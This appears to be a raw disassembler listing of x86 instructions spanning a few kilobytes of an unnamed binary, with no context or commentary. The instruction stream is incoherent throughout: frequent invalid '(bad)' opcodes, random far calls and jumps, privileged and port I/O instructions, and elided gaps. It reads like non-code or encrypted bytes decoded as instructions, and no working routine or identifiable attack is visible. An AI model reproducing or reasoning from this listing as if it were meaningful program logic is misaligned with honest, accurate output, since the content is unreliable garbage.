  4199a6:	inc    ecx
  4199a7:	arpl   WORD PTR [ebp+0x14],ax
  4199aa:	in     eax,dx
  4199ab:	clc    
  4199ac:	mov    dl,0x7c
  4199ae:	xchg   esi,edi
  4199b0:	test   BYTE PTR [ebp+0x5af01a7],dh
  4199b6:	mov    ecx,0xd83b3373
  4199bb:	out    0x7b,eax
  4199bd:	mov    eax,ds:0x20fc8daa
  4199c2:	pop    ebx
  4199c3:	test   BYTE PTR [ecx+0x68eb6946],dh
  4199c9:	(bad)  
  4199ca:	pop    edi
  4199cb:	adc    DWORD PTR [ebx+0x70],ebp
  4199ce:	sub    eax,0xf3f4ca85
  4199d3:	push   edi
  4199d4:	(bad)  
  4199d5:	test   DWORD PTR ds:0xfc721148,edi
  4199db:	xchg   BYTE PTR [eax-0x5a],dh
  4199de:	retf   
  4199df:	xor    esp,DWORD PTR [eax+0x40ef4827]
  4199e5:	ds ds mov ch,0x7f
  4199e9:	mov    al,bh
  4199eb:	jne    0x4199e7
  4199ed:	pushf  
  4199ee:	sub    edx,DWORD PTR [edi+0x18c17f25]
  4199f4:	and    BYTE PTR [ecx-0x8],0xd7
  4199f8:	cwde   
  4199f9:	stos   BYTE PTR es:[edi],al
  4199fa:	inc    esp
  4199fb:	outs   dx,DWORD PTR ds:[esi]
  4199fc:	adc    al,0xa3
  4199fe:	xor    al,bl
  419a00:	inc    ebx
  419a01:	stc    
  419a02:	mov    edi,0x8ace99ff
  419a07:	push   ecx
  419a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a09:	mov    bl,0xd9
  419a0b:	push   eax
  419a0c:	xor    DWORD PTR [ecx+ebx*1+0x6a],eax
  419a10:	sub    eax,DWORD PTR [eax]
	...
  419a72:	add    BYTE PTR [eax],al
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0xf6ba2c2,cl
  419a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    BYTE PTR [edx],bl
  419a8d:	or     dl,BYTE PTR ds:0xa34b232b
  419a93:	mov    ecx,0x51527610
  419a98:	or     edx,esp
  419a9a:	sbb    ebx,DWORD PTR [edx+0x6ebf68f6]
  419aa0:	ds pop ds
  419aa2:	fcmovbe st,st(4)
  419aa4:	add    eax,DWORD PTR [eax-0x1d]
  419aa7:	mov    BYTE PTR [edx-0x7b],al
  419aaa:	fs mov ch,0xa0
  419aad:	in     al,dx
  419aae:	ds into 
  419ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ab1:	leave  
  419ab2:	inc    ecx
  419ab3:	fnstcw WORD PTR [ebp-0x565df4db]
  419ab9:	xchg   DWORD PTR [esi-0x7f],edi
  419abc:	mov    dh,0xc9
  419abe:	jne    0x419a9e
  419ac0:	dec    edx
  419ac1:	ins    BYTE PTR es:[edi],dx
  419ac2:	jl     0x419b15
  419ac4:	dec    ebx
  419ac5:	pop    ebx
  419ac6:	dec    edx
  419ac7:	call   0x828b:0x297b568d
  419ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419acf:	fmul   st(4),st
  419ad1:	mov    ah,0xdb
  419ad3:	popf   
  419ad4:	lidtd  [ebx-0x58]
  419ad8:	xor    edi,esi
  419ada:	rcr    BYTE PTR [ecx-0x7c0f2299],1
  419ae0:	sub    al,0x2d
  419ae3:	loopne 0x419a71
  419ae5:	jns    0x419b53
  419ae7:	and    edx,DWORD PTR [esi+0x78]
  419aea:	adc    al,0x7d
  419aec:	add    BYTE PTR [edi-0x35],0x1b
  419af0:	shl    DWORD PTR [ecx+0x49],0xb9
  419af4:	dec    ecx
  419af5:	lods   eax,DWORD PTR ds:[esi]
  419af6:	test   BYTE PTR [ebx-0x2a],0xe0
  419afa:	nop
  419afb:	cvttps2pi mm7,QWORD PTR [edx]
  419afe:	mov    esi,0x2dc14c04
  419b03:	imul   edi,DWORD PTR [ecx-0x63],0x2821ba43
  419b0a:	retf   
  419b0b:	hlt    
  419b0c:	push   cs
  419b0d:	lods   eax,DWORD PTR ds:[esi]
  419b0e:	mov    cl,0x2a
  419b10:	fidivr WORD PTR ds:0xe9217933
  419b16:	xor    al,BYTE PTR [edi-0x5d]
  419b19:	dec    edx
  419b1a:	fdivp  st(0),st
  419b1c:	sahf   
  419b1d:	mov    ebp,0xf00a2c61
  419b22:	mov    esi,0xf056f9d
  419b27:	aam    0x6e
  419b29:	xchg   edx,eax
  419b2a:	int3   
  419b2b:	sbb    eax,0x93474eaf
  419b30:	imul   esp,DWORD PTR [bp+di-0x6c],0x248ff82d
  419b38:	mov    DWORD PTR [eax-0x3b82d00e],esp
  419b3e:	or     esp,DWORD PTR [edi]
  419b40:	inc    ecx
  419b41:	xchg   esi,eax
  419b42:	gs in  al,dx
  419b44:	jae    0x419b57
  419b46:	xchg   ecx,eax
  419b47:	mov    ds:0x8a30365a,eax
  419b4c:	xor    BYTE PTR [esi],0x99
  419b4f:	pop    ss
  419b50:	imul   edx,ebx,0xc93e0e8
  419b56:	pop    ds
  419b57:	test   al,0x88
  419b59:	sbb    al,0xbf
  419b5b:	cmp    eax,DWORD PTR [ecx+0x28]
  419b5e:	and    al,0x4e
  419b60:	repz jg 0x419b0a
  419b63:	push   ebp
  419b64:	call   0xd58b:0xc443c95
  419b6b:	jno    0x419bb4
  419b6d:	sub    BYTE PTR [ebx+edi*4+0x46],al
  419b71:	push   esi
  419b72:	cld    
  419b73:	pop    ss
  419b74:	hlt    
  419b75:	xor    DWORD PTR [ebp+0x2ee854e7],esp
  419b7b:	in     al,0xf4
  419b7d:	outs   dx,DWORD PTR ds:[esi]
  419b7e:	sbb    ecx,ebx
  419b80:	ja     0x419b63
  419b82:	aad    0x60
  419b84:	mov    ecx,0x769c5f24
  419b89:	mov    ebx,0x7b4bc448
  419b8e:	ret    
  419b8f:	in     eax,0xb4
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x23
  419c01:	mov    ds:0x1112358d,eax
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0xbc000001
  419c0d:	jno    0x419c10
  419c0f:	and    DWORD PTR [edi-0xc],ebp
  419c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c13:	push   ds
  419c14:	mov    ch,0x8c
  419c16:	push   eax
  419c17:	test   DWORD PTR [eax],edx
  419c19:	shl    BYTE PTR [edx+0xef1ebec],1
  419c1f:	fucomi st,st(2)
  419c21:	rcr    BYTE PTR [esp+edx*1-0x2ef956e9],0x4d
  419c29:	sti    
  419c2a:	cwde   
  419c2b:	xlat   BYTE PTR ds:[ebx]
  419c2c:	sub    BYTE PTR [ebp-0x7a04b775],bh
  419c32:	lods   eax,DWORD PTR ds:[esi]
  419c33:	xchg   BYTE PTR [eax-0x2],ch
  419c36:	add    BYTE PTR [esi+0x4e8578ea],dh
  419c3c:	jnp    0x419c02
  419c3e:	(bad)  
  419c3f:	das    
  419c40:	nop
  419c41:	out    0xc0,eax
  419c43:	xchg   esi,eax
  419c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c45:	(bad)  
  419c46:	outs   dx,BYTE PTR ds:[esi]
  419c47:	xchg   ebx,eax
  419c48:	push   0xfffffffa
  419c4a:	mov    DWORD PTR [ecx-0x306c95d4],eax
  419c50:	add    al,0x2b
  419c52:	test   BYTE PTR [edi],dh
  419c54:	pop    ds
  419c55:	dec    esi
  419c56:	dec    ebx
  419c57:	shl    eax,1
  419c59:	sbb    al,0x93
  419c5b:	pop    ss
  419c5c:	cli    
  419c5d:	jnp    0x419c79
  419c5f:	js     0x419cd5
  419c61:	pop    ebp
  419c62:	xor    edx,edx
  419c64:	lds    ebp,FWORD PTR [ebx+0x1d]
  419c67:	pop    ebx
  419c68:	mov    ch,0x66
  419c6a:	push   esi
  419c6b:	jp     0x419c52
  419c6d:	aam    0x2c
  419c6f:	ss popa 
  419c71:	jle    0x419ce3
  419c73:	or     eax,0xf2ce4f65
  419c78:	loop   0x419c4e
  419c7a:	mov    edx,0xda340c6b
  419c7f:	sub    al,0xa8
  419c81:	or     esp,edi
  419c83:	inc    edx
  419c84:	(bad)  
  419c85:	mov    bl,0xd1
  419c87:	or     eax,0x8f8190d4
  419c8c:	dec    ebx
  419c8d:	je     0x419cc8
  419c8f:	paddusb mm3,mm5
  419c92:	adc    DWORD PTR [edi],ebp
  419c94:	mov    esi,DWORD PTR [ecx+0x19]
  419c97:	dec    edi
  419c98:	retf   0x3b28
  419c9b:	add    BYTE PTR [ebp-0x76acfd51],dh
  419ca1:	mov    esp,0xc778fbf3
  419ca6:	pop    ds
  419ca7:	jmp    0xb8a5:0x1316a4a4
  419cae:	hlt    
  419caf:	mov    ebx,0xe6b5914b
  419cb4:	mov    ds:0xa5bf73f8,eax
  419cb9:	push   esi
  419cba:	xor    eax,0x1bcad13f
  419cbf:	jp     0x419ce2
  419cc1:	leave  
  419cc2:	fsubrp st(1),st
  419cc4:	out    0x4a,eax
  419cc6:	lock xor BYTE PTR [ebx+0x4a5abb54],bl
  419ccd:	fcmovnu st,st(0)
  419ccf:	ins    DWORD PTR es:[edi],dx
  419cd0:	loopne 0x419c98
  419cd2:	jns    0x419d0b
  419cd4:	mov    fs,WORD PTR [ecx+ebp*1-0x42]
  419cd8:	mov    ds:0x221d2435,eax
  419cdd:	pop    esi
  419cde:	add    eax,0xe48a2c5f
  419ce3:	push   0xce864899
  419ce8:	pusha  
  419ce9:	adc    edx,DWORD PTR [esi]
  419ceb:	xchg   esi,eax
  419cec:	jo     0x419ce7
  419cee:	and    eax,0x33149749
  419cf3:	add    eax,0xf9a978db
  419cf8:	and    ecx,DWORD PTR gs:[edi+0x6036fc29]
  419cff:	sub    ecx,DWORD PTR [edx+0x5d]
  419d02:	loop   0x419d32
  419d04:	adc    DWORD PTR [edx],eax
  419d06:	xchg   DWORD PTR [edx+0x697b4121],esp
  419d0c:	test   BYTE PTR [eax+0x25],dh
  419d0f:	shr    BYTE PTR ds:0x0,cl
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fimul  DWORD PTR ss:[ebx+0x17915772]
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x90000001,al
  419d8d:	jmp    0x419d65
  419d8f:	imul   bh
  419d91:	(bad)  
  419d92:	and    BYTE PTR [edx],bh
  419d94:	icebp  
  419d95:	or     al,0xcd
  419d97:	loope  0x419d7e
  419d99:	ds jb  0x419de3
  419d9c:	cwde   
  419d9d:	jle    0x419da6
  419d9f:	mov    edi,0x96ff0148
  419da4:	or     BYTE PTR [ebp-0x2db3b5eb],al
  419daa:	sbb    ebp,ebp
  419dac:	add    eax,0x90efe552
  419db1:	cmp    BYTE PTR [esi+0x17],ah
  419db4:	add    DWORD PTR [ebp+0x5d],ecx
  419db7:	pop    ss
  419db8:	arpl   WORD PTR [eax+0x3d],di
  419dbb:	in     al,dx
  419dbc:	(bad)  
  419dbd:	(bad)  
  419dbe:	fst    DWORD PTR [ebp-0x64a8e7d9]
  419dc4:	or     DWORD PTR [eax-0x4c63a5df],edx
  419dca:	push   DWORD PTR [ecx+0x73]
  419dcd:	sub    eax,0x50fd8b4d
  419dd2:	(bad)  
  419dd4:	pop    esp
  419dd5:	jg     0x419da5
  419dd7:	dec    esp
  419dd8:	mov    ds:0x7cc1cff2,al
  419ddd:	or     BYTE PTR [esi+0x30ac8258],dh
  419de3:	mov    bh,0xdc
  419de5:	and    DWORD PTR [ecx],esi
  419de7:	fimul  WORD PTR [ecx+ebp*4]
  419dea:	xchg   esi,eax
  419deb:	aam    0x43
  419ded:	push   edi
  419dee:	sub    al,BYTE PTR [esp+ebx*1]
  419df1:	mov    ds:0x8ef4fa80,al
  419df6:	adc    al,0xf4
  419df8:	add    eax,0xda2a1d6a
  419dfd:	mov    edi,0x958c2f11
  419e02:	mov    eax,ebp
  419e04:	dec    esi
  419e05:	xor    al,0xb
  419e07:	push   eax
  419e08:	xchg   DWORD PTR [ebx-0x6f],ecx
  419e0b:	mov    WORD PTR [ebx-0x53a0ced4],?
  419e11:	fucom  st(2)
  419e13:	das    
  419e14:	or     edx,0x7a
  419e17:	push   eax
  419e18:	cld    
  419e19:	mov    bh,0x56
  419e1b:	xchg   DWORD PTR [eax+esi*4],esi
  419e1e:	mov    ebx,0xd60a3680
  419e23:	and    esi,DWORD PTR [edi+0x74e32d28]
  419e29:	sbb    dh,0x4
  419e2c:	sbb    BYTE PTR [edx+edi*1-0x6d],0x31
  419e31:	sbb    al,0x61
  419e33:	xor    eax,0x499243f0
  419e38:	test   al,0x26
  419e3a:	loop   0x419de6
  419e3c:	push   esp
  419e3d:	jne    0x419e19
  419e3f:	cld    
  419e40:	push   ebp
  419e41:	rcr    BYTE PTR [edi-0x7e],0xcf
  419e45:	jmp    0x4e3de92f
  419e4a:	repz arpl WORD PTR [edx],si
  419e4d:	clc    
  419e4e:	mov    dl,ah
  419e50:	aad    0xff
  419e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e53:	push   0x3384a09a
  419e58:	mov    cl,0x55
  419e5a:	pop    es
  419e5b:	or     ah,dh
  419e5d:	call   0x30ed60a3
  419e62:	add    BYTE PTR [edx],ah
  419e64:	popf   
  419e65:	imul   edi,DWORD PTR [esi+eiz*2],0x19
  419e69:	ins    DWORD PTR es:[edi],dx
  419e6a:	call   0x5d78:0xa37cc249
  419e71:	ficom  DWORD PTR [ebx]
  419e73:	into   
  419e74:	sbb    eax,0x62ea1455
  419e79:	int    0xe5
  419e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e7c:	sub    bl,BYTE PTR [edi-0x29]
  419e7f:	mov    eax,ds:0x57accd41
  419e84:	add    DWORD PTR ds:0x98990363,0xffffffb2
  419e8b:	push   ebp
  419e8c:	dec    esi
  419e8d:	adc    BYTE PTR [edx+0x54d6],dl
	...
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	stos   DWORD PTR es:[edi],eax
  419f01:	test   ah,0x44
  419f04:	sbb    al,0x13
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0x51000001
  419f0d:	leave  
  419f0e:	push   esi
  419f0f:	inc    ebx
  419f10:	sbb    al,0xcc
  419f12:	das    
  419f13:	ret    
  419f14:	outs   dx,DWORD PTR ds:[esi]
  419f15:	or     BYTE PTR [ecx+0x72dcff38],cl
  419f1b:	into   
  419f1c:	push   ss
  419f1d:	fcmovu st,st(3)
  419f1f:	mov    WORD PTR [ebx],fs
  419f21:	push   ds
  419f22:	mov    esi,0x85c1935b
  419f27:	popf   
  419f28:	int3   
  419f29:	push   esi
  419f2a:	jo     0x419f1e
  419f2c:	and    DWORD PTR [ebp+0x4f],0xd7e33d19
  419f33:	jo     0x419ef5
  419f35:	pop    ss
  419f36:	repz enter 0x8b08,0x5
  419f3b:	pop    ds
  419f3c:	mov    ebp,0xacbae5c0
  419f41:	xchg   edi,eax
  419f42:	or     bh,al
  419f44:	pop    es
  419f45:	and    eax,0x9e0bdd80
  419f4a:	jbe    0x419ed9
  419f4c:	mov    esp,0xf399d0d4
  419f51:	pxor   mm4,mm3
  419f54:	push   0x6a88eae9
  419f59:	mov    edi,0x90a03f62
  419f5e:	imul   ebx,ebx,0x3
  419f61:	mov    eax,0x8b79310e
  419f66:	or     al,0xcf
  419f68:	dec    ecx
  419f69:	push   ebx
  419f6a:	push   0x5455d9de
  419f6f:	mov    edi,0x24d24875
  419f74:	xchg   edx,eax
  419f75:	jo     0x419f63
  419f77:	xlat   BYTE PTR ds:[ebx]
  419f78:	sub    BYTE PTR [ebp+0x572e2ab7],bh
  419f7e:	cmp    bl,BYTE PTR [esi-0x2f91dd25]
  419f84:	jno    0x419fe0
  419f86:	xchg   edi,eax
  419f87:	jb     0x419fa6
  419f89:	rcr    DWORD PTR [ebp+esi*4+0x25],1
  419f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f8e:	test   DWORD PTR [ebx+eiz*4-0x39fd5283],esi
  419f95:	xchg   ebp,eax
  419f96:	rcr    BYTE PTR [edx+eiz*1+0x336838c0],0xe4
  419f9e:	jno    0x419f2e
  419fa0:	jp     0x419f5a
  419fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fa3:	lahf   
  419fa4:	mov    esp,0x2a98e52e
  419fa9:	inc    eax
  419faa:	adc    eax,0xd42151f
  419faf:	nop
  419fb0:	dec    DWORD PTR [esi-0x1c]
  419fb3:	cpuid  
  419fb5:	push   edi
  419fb6:	and    esp,ecx
  419fb8:	aad    0x12
  419fba:	repz push esi
  419fbc:	cld    
  419fbd:	ds xor ch,ch
  419fc0:	mov    ebp,0x8d7e7e81
  419fc5:	call   0x3dab2ed2
  419fca:	cmp    ebx,edi
  419fcc:	fnstcw WORD PTR [ebp-0x70086e1]
  419fd2:	and    DWORD PTR [esi+0x24],esi
  419fd5:	pop    es
  419fd6:	sbb    edx,esp
  419fd8:	push   ds
  419fd9:	int3   
  419fda:	and    ecx,DWORD PTR [esi]
  419fdc:	mov    bh,0x74
  419fde:	lea    ax,[esi+eiz*1]
  419fe2:	sti    
  419fe3:	push   es
  419fe4:	outs   dx,BYTE PTR ds:[esi]
  419fe5:	mov    ds:0x27fc86aa,eax
  419fea:	outs   dx,DWORD PTR ds:[esi]
  419feb:	sub    DWORD PTR [ebx+0x120e9951],eax
  419ff1:	iret   
  419ff2:	les    edx,FWORD PTR [ecx-0x6a]
  419ff5:	and    bh,dh
  419ff7:	pop    eax
  419ff8:	rcl    BYTE PTR [eax+eax*8+0xf],1
  419ffc:	jnp    0x419fd5
  419ffe:	clc    
  419fff:	sar    ebp,0x5c
  41a002:	push   edx
  41a003:	mov    dl,0xbe
  41a005:	es ret 
  41a007:	cmp    esi,DWORD PTR [esi]
  41a009:	dec    edx
  41a00a:	lods   eax,DWORD PTR ds:[esi]
  41a00b:	lahf   
  41a00c:	sub    al,0x5b
  41a00e:	ins    DWORD PTR es:[edi],dx
  41a00f:	ror    BYTE PTR [eax+eax*1+0x0],0x0
	...
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x27],bh
  41a081:	adc    eax,0x1421a5e6
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    eax,0x3f000001
  41a08d:	pop    ebx
  41a08e:	adc    al,0xa0
  41a090:	loope  0x41a095
  41a092:	nop
  41a093:	pop    eax
  41a094:	test   BYTE PTR [ebx],0xa4
  41a097:	ds inc edi
  41a099:	cmp    al,0x47
  41a09b:	add    ah,bh
  41a09d:	loopne 0x41a098
  41a09f:	in     al,dx
  41a0a0:	pop    esp
  41a0a1:	out    dx,eax
  41a0a2:	in     al,dx
  41a0a3:	dec    edx
  41a0a4:	ds and ebp,edi
  41a0a7:	push   esp
  41a0a8:	xor    al,0xf1
  41a0aa:	push   0x72
  41a0ac:	call   0xa2f2:0x5c01d817
  41a0b3:	and    bl,al
  41a0b5:	xchg   ecx,eax
  41a0b6:	pushf  
  41a0b7:	inc    ebx
  41a0b8:	mov    ah,0xfe
  41a0ba:	fucomp st(0)
  41a0bc:	lea    edi,[eax]
  41a0be:	xchg   BYTE PTR [ebx+edi*8],dh
  41a0c1:	mov    gs,ebx
  41a0c3:	imul   ebp,ecx,0x14
  41a0c6:	mov    cl,0x6f
  41a0c8:	and    ebx,esi
  41a0ca:	add    bl,BYTE PTR [edi+0x6f]
  41a0cd:	mov    eax,ds:0x36d5b0f9
  41a0d2:	sbb    DWORD PTR [eax-0x32],ebx
  41a0d5:	pop    edx
  41a0d6:	xchg   BYTE PTR [ebx],cl
  41a0d8:	call   0xb288:0xd74cadae
  41a0df:	pop    edx
  41a0e0:	ins    DWORD PTR es:[edi],dx
  41a0e1:	push   cs
  41a0e2:	adc    al,0x9e
  41a0e4:	sbb    BYTE PTR [ebx+esi*2-0x16],0x13
  41a0e9:	xor    ah,bh
  41a0eb:	xchg   esi,eax
  41a0ec:	aam    0x9b
  41a0ee:	cs cwde 
  41a0f0:	xlat   BYTE PTR ds:[ebx]
  41a0f1:	xor    bl,BYTE PTR [ebx]
  41a0f3:	xchg   DWORD PTR [ebp-0x1ee75cf5],ebp
  41a0f9:	xchg   esp,eax
  41a0fa:	pop    ebp
  41a0fb:	jmp    0xe3bf:0x2b347a0f
  41a102:	stos   DWORD PTR es:[edi],eax
  41a103:	aaa    
  41a104:	mov    ebx,0xa5a3fb05
  41a109:	xor    dl,BYTE PTR [esi]
  41a10b:	retf   0x7605
  41a10e:	mov    esi,0x37f2e4d7
  41a113:	out    0x40,eax
  41a115:	inc    edi
  41a116:	dec    edi
  41a117:	ret    
  41a118:	pop    eax
  41a119:	dec    esp
  41a11a:	call   0xbbb7:0x95105088
  41a121:	gs cli 
  41a123:	sbb    eax,0xc85a62e3
  41a128:	aad    0xfb
  41a12a:	dec    eax
  41a12b:	fnstenv [ecx-0x24]
  41a12e:	xchg   DWORD PTR [esi+0x5c0ceb85],eax
  41a134:	lea    edi,[edi+0x18]
  41a137:	mov    ds:0xeffa9ec9,al
  41a13c:	or     dh,cl
  41a13e:	sahf   
  41a13f:	dec    edi
  41a140:	jno    0x41a148
  41a142:	pop    ecx
  41a143:	retf   
  41a144:	inc    esp
  41a145:	cs mov esp,0x216cba0
  41a14b:	fisttp QWORD PTR [eax-0x25]
  41a14e:	push   0x9a5f9700
  41a153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a155:	pop    ss
  41a156:	fwait
  41a157:	mul    DWORD PTR [ebx-0x2e]
  41a15a:	sbb    esp,DWORD PTR [edx]
  41a15c:	jns    0x41a142
  41a15e:	add    dl,ah
  41a160:	and    al,0xb8
  41a162:	(bad)  
  41a163:	cmc    
  41a164:	sub    BYTE PTR ds:0x420d6511,al
  41a16b:	out    0xa3,al
  41a16d:	repnz pop ecx
  41a16f:	(bad)  
  41a170:	or     eax,DWORD PTR [eax]
  41a172:	shl    esp,1
  41a174:	xchg   esp,eax
  41a175:	aad    0xdc
  41a177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a178:	jbe    0x41a187
  41a17a:	cwde   
  41a17b:	inc    edx
  41a17c:	call   0xe48d6dd6
  41a181:	js     0x41a111
  41a183:	cmp    BYTE PTR cs:[esp+ebx*2],0x46
  41a188:	loopne 0x41a1bd
  41a18a:	ror    ecx,1
  41a18c:	or     DWORD PTR [edx+0x418580],0x0
	...
  41a1f2:	add    BYTE PTR [eax],al
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	pop    edx
  41a201:	daa    
  41a202:	mov    ch,BYTE PTR [esi+eiz*1+0x15]
  41a206:	add    DWORD PTR [eax],eax
  41a208:	add    eax,0x38000001
  41a20d:	adc    edx,ecx
  41a20f:	dec    BYTE PTR [esi]
  41a211:	das    
  41a212:	les    edi,FWORD PTR [ecx-0x5f20d845]
  41a218:	pop    ds
  41a219:	adc    cl,0xcf
  41a21c:	mov    DWORD PTR [esi],0x5ec3f169
  41a222:	add    ah,BYTE PTR [eax]
  41a224:	mul    eax
  41a226:	daa    
  41a227:	js     0x41a226
  41a229:	jae    0x41a29e
  41a22b:	xor    eax,0x1d498ae8
  41a230:	mov    edx,DWORD PTR [edi]
  41a232:	mov    ds:0x907722e8,eax
  41a237:	div    DWORD PTR [ecx+0x5537e5f1]
  41a23d:	jno    0x41a257
  41a23f:	cmp    eax,0x4c904eb9
  41a244:	ins    DWORD PTR es:[edi],dx
  41a245:	jne    0x41a1db
  41a247:	mov    ds:0x64c208c3,al
  41a24c:	ins    DWORD PTR es:[edi],dx
  41a24d:	jbe    0x41a1e0
  41a24f:	and    dh,ah
  41a251:	bound  esi,QWORD PTR [ecx-0x6d9fce6d]
  41a257:	div    DWORD PTR [ebx+0x7d]
  41a25a:	mov    BYTE PTR [edi+eax*8],al
  41a25d:	jns    0x41a2af
  41a25f:	adc    eax,0xf1beb2b1
  41a264:	lea    ecx,[eax+0xd]
  41a267:	xor    dh,BYTE PTR [eax-0x67]
  41a26a:	loope  0x41a1f8
  41a26c:	jmp    0x5966:0x1ef4cc2d
  41a273:	call   DWORD PTR [edi-0x6d4e552b]
  41a279:	(bad)  
  41a27a:	mov    ah,0xcb
  41a27c:	push   esi
  41a27d:	or     al,BYTE PTR [ecx]
  41a27f:	xchg   DWORD PTR [eax-0x78],esi
  41a282:	imul   edi,DWORD PTR [edi+0x65],0x58
  41a286:	sbb    al,0x40
  41a288:	leave  
  41a289:	sub    al,0x8f
  41a28b:	add    DWORD PTR [ecx+edx*8+0x2e8e0716],ebx
  41a292:	sti    
  41a293:	mov    ds:0x5ea0bcd4,eax
  41a298:	sub    esp,DWORD PTR [edx]
  41a29a:	rol    eax,0x73
  41a29d:	out    dx,eax
  41a29e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a29f:	stos   DWORD PTR es:[edi],eax
  41a2a0:	sbb    eax,0xf93669db
  41a2a5:	jno    0x41a2c2
  41a2a7:	or     al,BYTE PTR [edi+0x45]
  41a2aa:	fdivr  st(0),st
  41a2ac:	jp     0x41a2d7
  41a2ae:	lds    esp,FWORD PTR ds:0xc32aa018
  41a2b4:	ins    BYTE PTR es:[edi],dx
  41a2b5:	pop    es
  41a2b6:	dec    ebx
  41a2b7:	push   eax
  41a2b8:	ins    BYTE PTR es:[edi],dx
  41a2b9:	or     BYTE PTR [edx+0x53],dl
  41a2bc:	pop    ebx
  41a2bd:	push   ebp
  41a2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2bf:	stc    
  41a2c0:	lods   al,BYTE PTR ds:[esi]
  41a2c1:	inc    esp
  41a2c2:	adc    ah,ah
  41a2c4:	add    ecx,DWORD PTR [ebx-0x31]
  41a2c7:	sahf   
  41a2c8:	in     al,0x49
  41a2ca:	lods   al,BYTE PTR ds:[esi]
  41a2cb:	popf   
  41a2cc:	fmul   QWORD PTR [edx-0x17]
  41a2cf:	mov    dl,0xa3
  41a2d1:	fs xchg esp,eax
  41a2d3:	mov    eax,ds:0x16d757e5
  41a2d8:	adc    dl,BYTE PTR [ebx+0x1e]
  41a2db:	loope  0x41a298
  41a2dd:	add    DWORD PTR [edx+0x34],ebp
  41a2e0:	(bad)  
  41a2e2:	cmp    cl,al
  41a2e4:	xchg   edi,eax
  41a2e5:	fwait
  41a2e6:	dec    esp
  41a2e7:	dec    esp
  41a2e8:	sub    ah,BYTE PTR [esi-0x21919900]
  41a2ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ef:	inc    ecx
  41a2f0:	mov    dl,0xe8
  41a2f3:	data16 scas al,BYTE PTR es:[edi]
  41a2f5:	std    
  41a2f6:	(bad)  
  41a2f7:	cs adc ch,cl
  41a2fa:	sub    DWORD PTR [edx-0x2de6630b],ebp
  41a300:	ret    0x5646
  41a303:	mov    es,WORD PTR [eax+0x25]
  41a306:	out    dx,al
  41a307:	push   0x6d
  41a309:	(bad)  
  41a30a:	xor    dh,dl
  41a30c:	or     ecx,DWORD PTR [ecx+0x4f34da]
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	fistp  DWORD PTR [eax+0x162bfbf2]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x7b000001
  41a38d:	mov    DWORD PTR [eax],ebx
  41a38f:	or     BYTE PTR [ecx-0x26913b4],bh
  41a395:	pop    eax
  41a396:	jl     0x41a39e
  41a398:	test   BYTE PTR [ecx],al
  41a39a:	cmp    edx,DWORD PTR [ebp-0xd]
  41a39d:	xor    edi,DWORD PTR [ebx+edi*4]
  41a3a0:	dec    ebp
  41a3a1:	jno    0x41a3e6
  41a3a3:	pop    eax
  41a3a4:	in     al,0x92
  41a3a6:	xor    BYTE PTR [ebp+0x622c8ce3],dl
  41a3ac:	jmp    0x41a407
  41a3ae:	or     al,bl
  41a3b0:	sbb    al,0x5d
  41a3b2:	sar    eax,cl
  41a3b4:	dec    eax
  41a3b5:	aad    0xa7
  41a3b7:	push   ds
  41a3b8:	bound  esi,QWORD PTR [edi-0x2bffd76a]
  41a3be:	mov    edx,0xcb0e9d0e
  41a3c3:	mov    al,0xf2
  41a3c5:	mov    al,0x9f
  41a3c7:	sar    ecx,1
  41a3c9:	into   
